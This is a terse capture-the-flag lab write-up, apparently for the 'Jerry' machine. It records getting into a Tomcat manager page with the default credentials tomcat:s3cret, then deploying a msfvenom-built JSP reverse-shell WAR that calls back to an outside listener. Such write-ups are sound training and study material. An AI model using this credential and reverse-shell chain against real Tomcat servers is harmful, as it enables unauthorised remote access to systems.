```
Jerry - 10.10.10.95
```

#Ports Open - 8080

#Detail of Ports
>8080	apache tomcat

#Findings + Exploitation
>found /manager
>used default user pass and got in
	tomcat:s3cret
>made a payload using msfvenom for .war
	msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.2 lport=9001 -f war > shell.war
>started a listener
>activated the shell
>found both the flags in Administrator/Desktop